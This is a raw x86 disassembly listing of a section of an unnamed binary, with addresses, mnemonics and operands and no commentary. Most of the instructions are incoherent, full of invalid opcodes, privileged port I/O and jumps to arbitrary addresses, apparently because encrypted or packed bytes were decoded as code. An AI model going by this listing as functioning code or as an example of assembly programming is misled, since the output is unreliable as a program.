  4153eb:	cmp    al,0x4c
  4153ed:	mov    bh,0xbe
  4153ef:	add    al,0x48
  4153f1:	and    eax,0xc2ea8506
  4153f6:	mov    al,ds:0x3217e7be
  4153fb:	ins    DWORD PTR es:[edi],dx
  4153fc:	mov    ch,0x7e
  4153fe:	push   esp
  4153ff:	sbb    BYTE PTR [edi],0xd6
  415402:	lahf   
  415403:	or     esi,DWORD PTR [esi+ebp*8]
  415406:	adc    eax,0x15310cfa
  41540b:	sbb    eax,0x689bc6d0
  415410:	outs   dx,DWORD PTR ds:[esi]
  415411:	dec    ecx
  415412:	sbb    eax,0x50465e3
  415417:	xor    DWORD PTR [eax-0x42],eax
  41541a:	mov    esp,0x50fe1310
  41541f:	into   
  415420:	dec    edx
  415421:	gs sub al,0x1b
  415424:	arpl   WORD PTR [edi],bp
  415426:	push   ds
  415427:	jmp    DWORD PTR [edx]
  415429:	std    
  41542a:	jae    0x415474
  41542c:	stos   DWORD PTR es:[edi],eax
  41542d:	push   0xffffffc2
  41542f:	mov    ecx,0x720c7951
  415434:	or     cl,BYTE PTR [edi-0x33e1df72]
  41543a:	push   es
  41543b:	nop
  41543c:	int3   
  41543d:	in     al,dx
  41543e:	aam    0x21
  415440:	pop    eax
  415441:	lea    ebx,[eax]
  415443:	or     bl,BYTE PTR [eax+edx*2-0x1]
  415447:	sub    eax,0xbd6eb876
  41544c:	push   es
  41544d:	loopne 0x4154a0
  41544f:	xor    BYTE PTR [ecx+0x4d],bh
  415452:	sub    BYTE PTR [ebp-0x4c],bh
  415455:	inc    edi
  415456:	fcmovnb st,st(2)
  415458:	jmp    0x415462
  41545a:	sbb    BYTE PTR [edx],0xe8
  41545d:	retf   
  41545e:	sbb    DWORD PTR [ebx],eax
  415460:	ret    
  415461:	(bad)  
  415462:	fdiv   st(3),st
  415464:	out    0x9c,eax
  415466:	fmul   DWORD PTR [ebx]
  415468:	test   DWORD PTR [ebx+eax*4+0x8],esp
  41546c:	pop    si
  41546e:	add    dl,dl
  415470:	mov    al,ds:0x3748551b
  415475:	nop
  415476:	cwde   
  415477:	mov    edx,0x20f2018
  41547c:	test   cl,dl
  41547e:	pop    esp
  41547f:	xchg   edi,eax
  415480:	(bad)  
  415482:	add    al,0xb9
  415484:	sub    ebp,ebp
  415486:	xchg   edx,eax
  415487:	or     al,0xe4
  415489:	push   edi
  41548a:	ins    DWORD PTR es:[edi],dx
  41548b:	lods   al,BYTE PTR ds:[esi]
  41548c:	sti    
  41548d:	adc    esi,DWORD PTR [edx+0x77]
  415490:	out    dx,eax
  415491:	pop    eax
  415492:	fwait
  415493:	(bad)  
  415494:	std    
  415495:	mov    ebx,0x4d551faa
  41549a:	sub    al,0xe2
  41549c:	inc    edx
  41549d:	icebp  
  41549e:	(bad)  
  41549f:	imul   edx,DWORD PTR [eax+edx*1],0x62
  4154a3:	mov    BYTE PTR [edx+0x11784410],bl
  4154a9:	and    BYTE PTR [ecx+0x3c],bh
  4154ac:	lahf   
  4154ad:	cmp    al,0xb7
  4154af:	dec    esi
  4154b0:	mov    bh,0x1a
  4154b2:	xchg   ebx,eax
  4154b3:	sbb    bh,BYTE PTR [edi-0x61bc9c48]
  4154b9:	bound  ebp,QWORD PTR [esi-0x7d]
  4154bc:	or     esp,DWORD PTR [ebx+0x47]
  4154bf:	jns    0x415482
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	mov    al,ds:0x9eac72f4
  4154c7:	cld    
  4154c8:	inc    edx
  4154c9:	jb     0x4154ef
  4154cb:	inc    edi
  4154cc:	cmp    eax,0xcb8dd49a
  4154d1:	sti    
  4154d2:	sbb    bl,ch
  4154d4:	mov    al,0xad
  4154d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154d7:	pop    ss
  4154d8:	lods   eax,DWORD PTR ds:[esi]
  4154d9:	int3   
  4154da:	sub    DWORD PTR [eax-0x4a],ebx
  4154dd:	outs   dx,DWORD PTR ds:[esi]
  4154de:	sbb    ebp,DWORD PTR [ebx-0x10d0189b]
  4154e4:	repnz push ebp
  4154e6:	sub    eax,esi
  4154e8:	sub    DWORD PTR [edx+0x2b],edi
  4154eb:	mov    ecx,0xeaa794b4
  4154f0:	sbb    DWORD PTR [ecx+0x32af1d44],eax
  4154f6:	inc    esi
  4154f7:	mov    eax,0xcc6cdbc1
  4154fc:	bound  eax,QWORD PTR [edi-0x2a]
  4154ff:	sbb    edx,edx
  415501:	jno    0x4154fb
  415503:	jne    0x415499
  415505:	fsubr  QWORD PTR [eax-0x7]
  415508:	js     0x41550d
  41550a:	retf   
  41550b:	stos   BYTE PTR es:[edi],al
  41550c:	dec    esi
  41550d:	ins    DWORD PTR es:[edi],dx
  41550e:	stc    
  41550f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415510:	xor    BYTE PTR ds:0xa4c3abe9,0x3c
  415517:	imul   esi,DWORD PTR [esi+edi*2+0x3a129da8],0xc
  41551f:	pop    esp
  415520:	fcom   QWORD PTR [ebp+0x36]
  415523:	add    eax,0x7b48ece2
  415528:	mov    edx,0xbfaaef6
  41552d:	cmp    cl,0x70
  415530:	mov    ah,BYTE PTR [eax+edi*4-0x6ff8a06b]
  415537:	pushf  
  415538:	adc    ebx,DWORD PTR [edi]
  41553a:	fwait
  41553b:	lahf   
  41553c:	fiadd  WORD PTR [ecx+0x6f]
  41553f:	test   BYTE PTR [esi+0x16],ah
  415542:	jbe    0x415555
  415544:	sbb    eax,ecx
  415546:	xor    DWORD PTR [edx],ebp
  415548:	jge    0x4154ca
  41554a:	inc    esp
  41554b:	ret    0x7aea
  41554e:	pop    esp
  41554f:	pop    ds
  415550:	ins    BYTE PTR es:[edi],dx
  415551:	fiadd  WORD PTR [esi+0x4f]
  415554:	push   esi
  415555:	sub    BYTE PTR [ebp-0x3d],bl
  415558:	adc    ch,bh
  41555a:	and    eax,0x38
  41555d:	ds sub esi,eax
  415560:	leave  
  415561:	(bad)  
  415562:	aad    0x5a
  415564:	mov    dh,0x3e
  415566:	sub    BYTE PTR [esi],0x79
  415569:	mov    DWORD PTR [edi-0x5a],ecx
  41556c:	inc    esi
  41556d:	out    dx,eax
  41556e:	clc    
  41556f:	mov    BYTE PTR [edx+0x7c],cl
  415572:	ror    DWORD PTR [edi-0xb],cl
  415575:	loope  0x41556d
  415577:	adc    dh,BYTE PTR [ebp+0x73]
  41557a:	ds dec edi
  41557c:	dec    eax
  41557d:	test   DWORD PTR [esp+eax*2-0x6ae7563a],edx
  415584:	inc    ebp
  415585:	sub    DWORD PTR [ecx-0x30b39e],esp
  41558b:	aad    0x26
  41558d:	and    al,0x3a
  41558f:	cmp    al,0xa3
  415591:	jmp    0xe1b9d553
  415596:	je     0x41557a
  415598:	mov    ch,0x56
  41559a:	cdq    
  41559b:	mov    DWORD PTR [ecx-0x39],ebx
  41559e:	arpl   bp,cx
  4155a0:	out    dx,eax
  4155a1:	ds fs mov ch,0x50
  4155a5:	push   0x3b
  4155a7:	push   ds
  4155a8:	lods   eax,DWORD PTR ds:[esi]
  4155a9:	xchg   ecx,eax
  4155aa:	test   BYTE PTR [edi+0x4c],bh
  4155ad:	or     eax,0xcc19e15e
  4155b2:	aas    
  4155b3:	add    al,0xc6
  4155b5:	adc    DWORD PTR [esp+eiz*2],ecx
  4155b8:	lods   al,BYTE PTR ds:[esi]
  4155b9:	popa   
  4155ba:	and    bl,BYTE PTR [ebp-0x1c2bf902]
  4155c0:	jmp    0x59b94601
  4155c5:	mov    esi,edi
  4155c7:	cmc    
  4155c8:	inc    esp
  4155c9:	dec    eax
  4155ca:	and    DWORD PTR [eax+0x36],ecx
  4155cd:	aad    0x72
  4155cf:	jmp    0x4304:0xae73c2fe
  4155d6:	mov    ebx,0x27d59270
  4155db:	lods   al,BYTE PTR ds:[esi]
  4155dc:	cs jge 0x415587
  4155df:	je     0x415636
  4155e1:	cmp    DWORD PTR [ebp-0x5f6ab8d5],edx
  4155e7:	cmp    al,0xa9
  4155ea:	shld   DWORD PTR [ebx],esi,cl
  4155ed:	cmc    
  4155ee:	cmp    DWORD PTR [ecx],0x2fea883f
  4155f4:	mov    eax,0x61c1b548
  4155f9:	xchg   esp,eax
  4155fa:	fnstcw WORD PTR [edi-0x7d]
  4155fd:	test   eax,0x116c7596
  415602:	adc    dh,BYTE PTR [esi]
  415604:	mov    ebp,0xbc2cf24c
  415609:	adc    eax,0xfd46ee1d
  41560e:	stc    
  41560f:	xor    DWORD PTR [eax+edi*4-0x4164a5db],0xffffffbc
  415617:	call   0x2df1:0xdc2e661b
  41561e:	jb     0x4155ef
  415620:	jg     0x415657
  415622:	jle    0x415655
  415624:	retf   0xfeba
  415627:	pop    esp
  415628:	and    DWORD PTR [ebp+0x65ee35fd],ebp
  41562e:	sbb    al,0xd2
  415630:	lds    ecx,FWORD PTR [ecx+0x4d]
  415633:	(bad)  
  415634:	mov    esi,0xa2ee7a10
  415639:	pop    edi
  41563a:	mov    ah,0x7
  41563c:	pop    es
  41563d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41563e:	mov    edi,edx
  415640:	inc    edx
  415641:	push   ecx
  415642:	popa   
  415643:	inc    edx
  415644:	mov    dl,BYTE PTR [eax+0x5c]
  415647:	sbb    esi,edx
  415649:	xor    DWORD PTR [eax-0x55],edx
  41564c:	jne    0x4155eb
  41564e:	out    0x7c,eax
  415650:	mov    al,ds:0xfd5b34ba
  415655:	sbb    DWORD PTR [edx],edi
  415657:	iret   
  415658:	mov    al,ds:0x2841fdc
  41565d:	adc    BYTE PTR [esi],dl
  41565f:	pop    ecx
  415660:	sub    DWORD PTR [esi],0xbd7aae22
  415666:	add    esp,DWORD PTR [ecx]
  415668:	ja     0x415624
  41566a:	xor    DWORD PTR [eax+0x434595ef],0xdb7c1fc2
  415674:	test   BYTE PTR [edi],cl
  415676:	cmp    eax,0x96a23855
  41567b:	dec    esi
  41567c:	in     al,dx
  41567d:	pop    esi
  41567e:	add    BYTE PTR [ebx-0x117cafa2],al
  415684:	adc    BYTE PTR [ebx],cl
  415686:	mov    ds:0xe707e9c8,eax
  41568b:	push   0xde91273d
  415690:	mov    ch,0xbf
  415692:	es jno 0x415659
  415695:	sub    BYTE PTR [edx],bh
  415697:	add    DWORD PTR [edi],0x1
  41569a:	mov    esi,0x70f86d53
  41569f:	cs popw es
  4156a2:	int    0x60
  4156a4:	xlat   BYTE PTR ds:[ebx]
  4156a5:	(bad)  
  4156a7:	jmp    0xb6e1c150
  4156ac:	sub    eax,0x6b240b9a
  4156b1:	cmc    
  4156b2:	scas   al,BYTE PTR es:[edi]
  4156b3:	enter  0x765b,0x90
  4156b7:	(bad)  
  4156b8:	lds    esi,FWORD PTR [ecx]
  4156ba:	fisttp WORD PTR [ebp+0x70]
  4156bd:	ret    0xc127
  4156c0:	jbe    0x415735
  4156c2:	mov    cl,0x46
  4156c4:	repnz mov WORD PTR es:[ebx+0x31],es
  4156c9:	mov    DWORD PTR [edx],ebx
  4156cb:	inc    ebp
  4156cc:	push   edx
  4156cd:	(bad)  
  4156cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156d0:	icebp  
  4156d1:	and    ebx,ecx
  4156d3:	push   edx
  4156d4:	xor    eax,0x516c5391
  4156d9:	add    al,0x67
  4156db:	or     bl,bh
  4156dd:	ds call 0x39a3d45f
  4156e3:	jmp    0x9bf31a75
  4156e8:	scas   al,BYTE PTR es:[edi]
  4156e9:	in     al,dx
  4156ea:	mov    esi,0x9342b6a4
  4156ef:	push   ebp
  4156f0:	cmp    eax,0xbfbc50ca
  4156f5:	rcl    BYTE PTR ss:[eax],0x9b
  4156f9:	mov    bl,BYTE PTR [esi-0x2f]
  4156fc:	jbe    0x415746
  4156fe:	jb     0x41570e
  415700:	popf   
  415701:	data16 jne 0x41573c
  415704:	mov    ah,ah
  415706:	in     eax,dx
  415707:	lock inc esp
  415709:	nop
  41570a:	aad    0x5
  41570c:	fisub  DWORD PTR [esi+0x4687930c]
  415712:	mov    bh,0x99
  415714:	lahf   
  415715:	in     al,dx
  415716:	(bad)  
  415718:	repnz lahf 
  41571a:	jge    0x41577d
  41571c:	mov    dl,0xfc
  41571e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41571f:	out    0x5c,eax
  415721:	jno    0x415752
  415723:	xchg   edx,eax
  415724:	push   eax
  415725:	xchg   ebp,eax
  415726:	addr16 jb 0x415750
  415729:	ror    esi,cl
  41572b:	dec    ebx
  41572c:	out    0xb3,al
  41572e:	push   ds
  41572f:	sbb    eax,0x39c119d4
  415734:	pop    esi
  415735:	stc    
  415736:	ins    BYTE PTR es:[edi],dx
  415737:	xor    eax,DWORD PTR ds:0xfacb149f
  41573d:	push   ss
  41573e:	mov    al,0x17
  415740:	mov    ch,0xb8
  415742:	cmp    eax,0x17a99b6d
  415747:	cmc    
  415748:	jg     0x41579f
  41574a:	xchg   DWORD PTR [ecx+eax*2],edx
  41574d:	pop    esi
  41574e:	in     al,dx
  41574f:	outs   dx,BYTE PTR ds:[esi]
  415750:	and    eax,0x73593284
  415755:	jmp    0xa86ae51
  41575a:	mov    dh,0x40
  41575c:	fcmovnbe st,st(1)
  41575e:	lods   al,BYTE PTR ds:[esi]
  41575f:	pop    eax
  415760:	push   edi
  415761:	(bad)  
  415762:	out    dx,eax
  415763:	daa    
  415764:	mov    al,ds:0x6bddc988
  415769:	push   ss
  41576a:	push   es
  41576b:	push   ebx
  41576c:	jecxz  0x415725
  41576e:	or     eax,0x3b1f019b
  415773:	mov    ebp,0x258e8f05
  415778:	int3   
  415779:	sbb    DWORD PTR ds:0xb81ec76f,esp
  41577f:	test   al,0x40
  415781:	fwait
  415782:	lods   al,BYTE PTR ds:[esi]
  415783:	pop    es
  415784:	ds cwde 
  415786:	stos   DWORD PTR es:[edi],eax
  415787:	aad    0x82
  415789:	inc    edx
  41578a:	or     al,0x3c
  41578c:	mov    eax,0xcac92212
  415791:	xor    al,0x26
  415793:	mov    bh,0x5d
  415795:	scas   eax,DWORD PTR es:[edi]
  415796:	fmul   DWORD PTR [edi+0x9d1de7d]
  41579c:	in     eax,dx
  41579d:	ss aam 0x89
  4157a0:	jns    0x4157f6
  4157a2:	jle    0x41574a
  4157a4:	or     eax,0x32d6f713
  4157a9:	fimul  WORD PTR [ebx]
  4157ab:	mov    ds:0x4bffae16,al
  4157b0:	stc    
  4157b1:	cmp    ecx,DWORD PTR ds:0x8ef31003
  4157b7:	xor    al,0x53
  4157b9:	adc    BYTE PTR [esi+edx*1],ch
  4157bc:	loop   0x415779
  4157be:	inc    esp
  4157bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157c0:	bound  edx,QWORD PTR [ecx+0x11]
  4157c3:	cli    
  4157c4:	ds mov edi,0x3c3c0d1c
  4157ca:	jbe    0x41580b
  4157cc:	test   BYTE PTR cs:[edx-0x33f455f5],al
  4157d3:	xchg   esi,eax
  4157d4:	mov    eax,ds:0x5636bdac
  4157d9:	jg     0x415850
  4157db:	jmp    0xd5f6:0xe5521da6
  4157e2:	dec    edx
  4157e3:	daa    
  4157e4:	aad    0x63
  4157e6:	fsub   QWORD PTR [edx+0x3f]
  4157e9:	dec    esi
  4157ea:	mov    dl,0x24
  4157ec:	enter  0x9524,0xb3
  4157f0:	adc    al,0xa6
  4157f2:	cmp    DWORD PTR [edi+0x5],0x326e284e
  4157f9:	loop   0x4157bd
  4157fb:	mov    esp,0x73f2818e
  415800:	xchg   ebp,eax
  415801:	imul   edi,DWORD PTR [edx+0x2faac0f],0xb02efc1
  41580b:	jge    0x415821
  41580d:	xor    ecx,ecx
  41580f:	or     edx,ecx
  415811:	mov    ecx,DWORD PTR [ebx]
  415813:	mov    DWORD PTR [ebp-0x64],edi
  415816:	mov    edi,DWORD PTR [ebx+0x4]
  415819:	mov    edi,ecx
  41581b:	xor    ecx,ecx
  41581d:	shl    edi,0x1e
  415820:	jmp    0x415daa
  415825:	scas   al,BYTE PTR es:[edi]
  415826:	rcr    BYTE PTR ds:[ebx+0x20],0x59
  41582b:	and    al,0x32
  41582d:	ja     0x41587c
  41582f:	lods   al,BYTE PTR ds:[esi]
  415830:	scas   al,BYTE PTR es:[edi]
  415831:	(bad)  
  415832:	out    0x54,eax
  415834:	mov    dl,0xf9
  415836:	mov    ebp,0x43d160c
  41583b:	push   ss
  41583c:	push   ss
  41583d:	mov    eax,0x8ae7eb12
  415842:	or     al,0x2
  415844:	xchg   ebx,eax
  415845:	or     DWORD PTR [edx+0x130acf0d],edi
  41584b:	sar    BYTE PTR [ebx],cl
  41584d:	push   0xffffff87
  41584f:	bound  esi,QWORD PTR [ecx+0x51]
  415852:	inc    esi
  415853:	cmp    DWORD PTR [eax],esi
  415855:	mov    cs,WORD PTR [ecx+0x59]
  415858:	pop    esi
  415859:	js     0x415812
  41585b:	xlat   BYTE PTR ds:[ebx]
  41585c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41585d:	push   0xffffffc7
  41585f:	jl     0x4157e4
  415861:	pop    ss
  415862:	sbb    esi,DWORD PTR [ebx]
  415864:	js     0x4158a6
  415866:	repz test eax,0x5d9802c5
  41586c:	fwait
  41586d:	std    
  41586e:	out    0x1c,al
  415870:	jg     0x415872
  415872:	daa    
  415873:	lahf   
  415874:	or     al,0x20
  415876:	addr16 pop edi
  415878:	sti    
  415879:	es pop ds
  41587b:	not    DWORD PTR [edi-0x463fe103]
  415881:	jmp    0x4158c9
  415883:	(bad)  
  415885:	jbe    0x415905
  415887:	popf   
  415888:	adc    ebp,DWORD PTR [edi+0x862cbca]
  41588e:	sti    
  41588f:	or     BYTE PTR [esi+ecx*4],al
  415892:	mov    esp,0x8575f316
  415897:	and    cl,BYTE PTR [eax+edx*8]
  41589a:	adc    DWORD PTR [eax+0x6374c544],esp
  4158a0:	jle    0x415841
  4158a2:	adc    al,0xb7
  4158a4:	pop    esp
  4158a5:	js     0x4158d8
  4158a7:	cmp    eax,DWORD PTR [ecx-0x777c43c3]
  4158ad:	enter  0x3eaf,0x5b
  4158b1:	cmp    DWORD PTR [ecx],ebp
  4158b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b4:	mov    al,ds:0x3fa6fc11
  4158b9:	pushf  
  4158ba:	scas   al,BYTE PTR es:[edi]
  4158bb:	push   es
  4158bc:	js     0x4158d6
  4158be:	or     dh,BYTE PTR [ecx]
  4158c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158c1:	rcr    DWORD PTR [ecx+0x582f3a3f],1
  4158c7:	push   edi
  4158c8:	stos   BYTE PTR es:[edi],al
  4158c9:	test   DWORD PTR [edx+0x15c7e765],0xe8364aa9
  4158d3:	test   eax,0x3fa605e2
  4158d8:	loop   0x41594c
  4158da:	out    dx,eax
  4158db:	jne    0x41591a
  4158dd:	cld    
  4158de:	enter  0xe9c2,0xf5
  4158e2:	xor    esp,DWORD PTR [esi]
  4158e4:	jle    0x415957
  4158e6:	mov    eax,ds:0x72e2a62c
  4158eb:	in     al,0x75
  4158ed:	jg     0x415888
  4158ef:	and    edi,eax
  4158f1:	lods   eax,DWORD PTR ds:[esi]
  4158f2:	or     al,0x36
  4158f4:	aas    
  4158f5:	and    DWORD PTR [ebp+0x62],0x4b0588b7
  4158fc:	fwait
  4158fd:	call   esp
  4158ff:	test   al,0x40
  415901:	cld    
  415902:	data16 jne 0x4158e7
  415905:	mov    edi,0x4627c10e
  41590a:	jp     0x415907
  41590c:	push   edx
  41590d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41590e:	mov    cl,0x57
  415910:	jae    0x41597b
  415912:	inc    ecx
  415913:	inc    edi
  415915:	leave  
  415916:	cmc    
  415917:	pop    eax
  415918:	aam    0xe2
  41591a:	xchg   BYTE PTR [edx-0x1f],dl
  41591d:	push   ecx
  41591e:	std    
  41591f:	test   BYTE PTR [ecx-0x68],al
  415922:	sbb    ah,BYTE PTR [ecx+0x15]
  415925:	stc    
  415926:	aam    0x39
  415928:	mov    eax,ds:0x7bc04ab5
  41592d:	fld    TBYTE PTR [eax]
  41592f:	add    edx,DWORD PTR [eax-0x4]
  415932:	or     eax,0x501d0a11
  415937:	in     eax,0x38
  415939:	pop    DWORD PTR [edx]
  41593b:	sbb    BYTE PTR [ecx-0x5],bl
  41593e:	jo     0x41596a
  415940:	retf   
  415941:	clc    
  415942:	cwde   
  415943:	lds    edx,FWORD PTR [esi-0x27]
  415946:	(bad)  
  415947:	fisub  DWORD PTR [edi-0x41645cc3]
  41594d:	les    ebp,FWORD PTR [esi+0x23e7cef2]
  415953:	lock js 0x4159b6
  415956:	out    dx,eax
  415957:	pushf  
  415958:	cmp    DWORD PTR [edx-0x55],0x9f0ee487
  41595f:	push   cs
  415960:	cmp    DWORD PTR [ebp+0x57ee7f8c],ecx
  415966:	cmp    DWORD PTR [ebx+eax*4-0x3c],ebp
  41596a:	scas   eax,DWORD PTR es:[edi]
  41596b:	sbb    cl,BYTE PTR [edi]
  41596d:	sub    edi,ebp
  41596f:	pop    ss
  415970:	or     DWORD PTR ds:0xc2261797,0xffffffbb
  415977:	and    ah,BYTE PTR [ebp+0x65]
  41597a:	pop    ebx
  41597b:	std    
  41597c:	lahf   
  41597d:	loop   0x4159aa
  41597f:	aad    0xc2
  415981:	inc    ecx
  415982:	hlt    
  415983:	push   edi
  415984:	or     al,0x9e
  415986:	scas   eax,DWORD PTR es:[edi]
  415987:	jecxz  0x4159d2
  415989:	stos   BYTE PTR es:[edi],al
  41598a:	mov    al,ds:0x92b6e241
  41598f:	test   DWORD PTR [ebx],ebx
  415991:	or     cl,BYTE PTR [edi-0x1c4b86de]
  415997:	gs push ecx
  415999:	xchg   esi,eax
  41599a:	jnp    0x4159fc
  41599c:	add    ah,al
  41599e:	push   esi
  41599f:	add    eax,0x244654bf
  4159a4:	jne    0x41599d
  4159a6:	rcl    BYTE PTR [esi],cl
  4159a8:	test   al,0xca
  4159aa:	enter  0xc5a4,0x48
  4159ae:	dec    ecx
  4159af:	clc    
  4159b0:	mov    al,fs:0xfa10be59
  4159b6:	fisub  DWORD PTR [ebx+0x3fe31373]
  4159bc:	xchg   ecx,eax
  4159bd:	mov    ah,0x98
  4159bf:	icebp  
  4159c0:	jg     0x4159ff
  4159c2:	sbb    esi,DWORD PTR [ecx]
  4159c4:	shl    BYTE PTR [edi+0x4d],1
  4159c7:	and    eax,0x3823a6e4
  4159cc:	fist   DWORD PTR [esi-0x308636ff]
  4159d2:	pop    esi
  4159d3:	mov    eax,DWORD PTR [esi-0x51f47edd]
  4159d9:	mov    cl,0xf2
  4159db:	inc    eax
  4159dc:	jbe    0x415988
  4159de:	jl     0x415a48
  4159e0:	ffree  st(3)
  4159e2:	(bad)  
  4159e3:	loope  0x4159fb
  4159e5:	xchg   esp,eax
  4159e6:	mov    ebx,DWORD PTR [edx+0x66]
  4159e9:	cmp    ebp,DWORD PTR ds:0xa26c3488
  4159ef:	shl    DWORD PTR [edi+0x7cf69c55],1
  4159f5:	ficomp WORD PTR [edi-0x7b1adefa]
  4159fb:	fild   DWORD PTR [ecx+0x49]
  4159fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159ff:	pop    ecx
  415a00:	popf   
  415a01:	pop    ds
  415a02:	test   bl,al
  415a04:	ret    0x4ebb
  415a07:	outs   dx,BYTE PTR ds:[esi]
  415a08:	mov    esp,0xe74ce14
  415a0d:	sbb    al,0x15
  415a0f:	out    0xcb,eax
  415a11:	mov    ds:0xb4c9109d,eax
  415a16:	popf   
  415a17:	add    BYTE PTR [ecx+0x30eed189],0xf7
  415a1e:	xchg   ebp,eax
  415a1f:	cmp    BYTE PTR [edi+0x5c558292],ah
  415a25:	jnp    0x415a7b
  415a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a28:	sar    DWORD PTR [edx],1
  415a2a:	data16 jge 0x4159f2
  415a2d:	inc    ebp
  415a2e:	std    
  415a2f:	xchg   edx,eax
  415a30:	je     0x415a05
  415a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a33:	push   esi
  415a34:	rol    DWORD PTR [edi],0x41
  415a37:	dec    ebp
  415a38:	retf   
  415a39:	aad    0x28
  415a3b:	mov    ebp,0x4460d19f
  415a40:	hlt    
  415a41:	icebp  
  415a42:	aam    0x69
  415a44:	loop   0x415a2d
  415a46:	pop    ecx
  415a47:	sahf   
  415a48:	xor    bh,BYTE PTR [ecx-0x63087767]
  415a4e:	dec    ebx
  415a4f:	sub    BYTE PTR [edi+0x7e],bl
  415a52:	(bad)  
  415a53:	push   ebx
  415a54:	into   
  415a55:	dec    esi
  415a56:	jg     0x415a31
  415a58:	fstp   DWORD PTR [ebp-0x397f488a]
  415a5e:	jb     0x415a14
  415a60:	loope  0x415a1d
  415a62:	retf   0x1c24
  415a65:	cli    
  415a66:	outs   dx,DWORD PTR ds:[esi]
  415a67:	dec    ebx
  415a69:	dec    ebp
  415a6a:	mov    ebx,ebx
  415a6c:	out    dx,al
  415a6d:	scas   eax,DWORD PTR es:[edi]
  415a6e:	mov    cl,0x6e
  415a70:	push   edi
  415a71:	fnstcw WORD PTR [ebx+0x216849c7]
  415a77:	jnp    0x415a1e
  415a79:	ret    
  415a7a:	and    ah,BYTE PTR [edx-0x34]
  415a7d:	call   ebx
  415a7f:	sbb    esp,DWORD PTR [edx]
  415a81:	sub    dl,BYTE PTR ds:0x5119002d
  415a87:	mov    ?,esi
  415a89:	rcl    BYTE PTR [eax-0x1a],cl
  415a8c:	mov    bh,0x53
  415a8e:	xchg   ah,bh
  415a90:	repnz movzx ecx,BYTE PTR [ecx+0x5]
  415a95:	ds or  ebx,ebp
  415a98:	ror    BYTE PTR [ebp-0x2a7f7b03],cl
  415a9e:	out    dx,eax
  415a9f:	sbb    BYTE PTR [edi+0x22ce3e10],dh
  415aa5:	xchg   esp,eax
  415aa6:	or     bl,BYTE PTR [eax-0x380a570f]
  415aac:	mov    bh,0x99
  415aae:	xchg   ebx,eax
  415aaf:	sub    al,0xd8
  415ab1:	or     eax,0xad039bbd
  415ab6:	pop    eax
  415ab7:	add    ch,ah
  415ab9:	xchg   esi,eax
  415aba:	call   0xab9e:0xeff1e71c
  415ac1:	dec    ebx
  415ac2:	mov    ds:0x565f1d4b,al
  415ac7:	mov    edi,0x41a243f1
  415acc:	out    dx,eax
  415acd:	mul    BYTE PTR [edi+0x19]
  415ad0:	inc    eax
  415ad1:	fwait
  415ad2:	jl     0x415a56
  415ad4:	add    eax,0xf19e7159
  415ad9:	mov    bl,0xb2
  415adb:	xor    DWORD PTR [ecx],esp
  415add:	mov    dl,BYTE PTR [edx-0x64]
  415ae0:	push   edx
  415ae1:	pop    eax
  415ae2:	mov    ds:0x140bebe7,al
  415ae7:	sti    
  415ae8:	adc    eax,0x6730ed4f
  415aed:	push   ds
  415aee:	xchg   DWORD PTR [edx-0x436a894c],eax
  415af4:	sbb    al,0x4b
  415af6:	xchg   ebx,esp
  415af8:	mov    ds:0x534ec2cc,eax
  415afd:	push   ebp
  415afe:	int    0x65
  415b00:	push   0xa27b85f8
  415b05:	lock sub dl,BYTE PTR [esi]
  415b08:	int    0xd2
  415b0a:	jno    0x415b6d
  415b0c:	dec    esp
  415b0d:	dec    esp
  415b0e:	icebp  
  415b0f:	jae    0x415aae
  415b11:	sub    DWORD PTR [edi+0x4c],ebx
  415b14:	test   bl,0x43
  415b17:	fldenv [esi+0x4879393c]
  415b1d:	mov    dh,0x6
  415b1f:	and    BYTE PTR [ecx],al
  415b21:	ror    DWORD PTR [edx-0x3e],1
  415b24:	ds pmaxsw mm0,mm3
  415b28:	xor    eax,0x7c5b0a12
  415b2d:	sub    BYTE PTR [ecx+0x4b],al
  415b30:	mov    edi,0x92d5167c
  415b35:	test   DWORD PTR [ebp-0x51929a6b],ebp
  415b3b:	cmp    al,0x3b
  415b3d:	xor    bh,BYTE PTR [ecx]
  415b3f:	lock xor DWORD PTR [edi+edx*1+0x3],ecx
  415b44:	idiv   BYTE PTR ds:0x1fc04e75
  415b4a:	cld    
  415b4b:	int3   
  415b4c:	jno    0x415baf
  415b4e:	cmp    al,BYTE PTR [edi+0x3aaa569c]
  415b54:	retf   
  415b55:	(bad)  
  415b56:	mov    esi,0x78df622d
  415b5b:	xor    esp,DWORD PTR gs:[ebp-0x579ce9d4]
  415b62:	call   0x5abd:0x127bae5d
  415b69:	jne    0x415af3
  415b6b:	(bad)  
  415b6c:	lds    edx,FWORD PTR [esp+ebp*1]
  415b6f:	addr16 retf 
  415b71:	addr16 hlt 
  415b73:	jl     0x415b43
  415b75:	out    0xca,al
  415b77:	push   eax
  415b78:	push   es
  415b79:	gs pop ss
  415b7b:	inc    eax
  415b7c:	push   es
  415b7d:	(bad)  
  415b7e:	rcr    DWORD PTR [eax-0x6d38e6fa],1
  415b84:	cli    
  415b85:	pop    ebx
  415b86:	add    bh,BYTE PTR ds:0x5a2ba845
  415b8c:	push   edx
  415b8d:	inc    esi
  415b8e:	jne    0x415b4b
  415b90:	mov    ds:0x33ccd6e8,eax
  415b95:	mov    ecx,0x8f9b430f
  415b9a:	mov    esi,0x4b1d71fa
  415ba0:	xor    esi,DWORD PTR [esi]
  415ba2:	repz or ebp,ebp
  415ba5:	sub    BYTE PTR [ecx+0x34422519],al
  415bab:	jns    0x415c20
  415bad:	adc    DWORD PTR [edi],ebx
  415baf:	loopne 0x415b8a
  415bb1:	mov    esp,0x8e070263
  415bb6:	repnz mov al,0x22
  415bb9:	push   ebx
  415bba:	mov    cl,BYTE PTR [esi]
  415bbc:	mov    al,ds:0x5e7c16ff
  415bc1:	or     ah,cl
  415bc3:	out    dx,al
